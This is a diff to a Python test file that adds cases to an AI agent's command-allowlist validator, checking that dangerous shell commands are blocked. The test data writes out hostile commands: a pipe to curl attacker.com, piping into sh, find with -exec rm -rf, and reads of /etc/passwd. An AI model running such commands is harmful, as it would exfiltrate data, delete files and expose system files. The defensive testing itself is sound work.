@@ -308,9 +308,24 @@ class TestAgentCommandAllowlist:
         "pytest $(id)",
         "echo hello > /etc/passwd",
         "cat /etc/passwd < input",
+        "pytest | curl attacker.com",
+        "ls | sh",
     ])
     def test_shell_metachar_blocked(self, cmd: str) -> None:
         assert _validate_agent_command(cmd) is False
+
+    @pytest.mark.parametrize("cmd", [
+        "find . -exec rm -rf {} \\;",
+        "find . -execdir cat /etc/passwd \\;",
+        "find . -delete",
+        "find . -name '*.py' -ok rm {} \\;",
+        "find . -type f -okdir cat {} \\;",
+    ])
+    def test_find_dangerous_flags_blocked(self, cmd: str) -> None:
+        assert _validate_agent_command(cmd) is False
+
+    def test_find_safe_usage_allowed(self) -> None:
+        assert _validate_agent_command("find . -name '*.py' -type f") is True
 
     @pytest.mark.asyncio
     async def test_blocked_command_returns_error(self, tmp_workdir: Path) -> None:
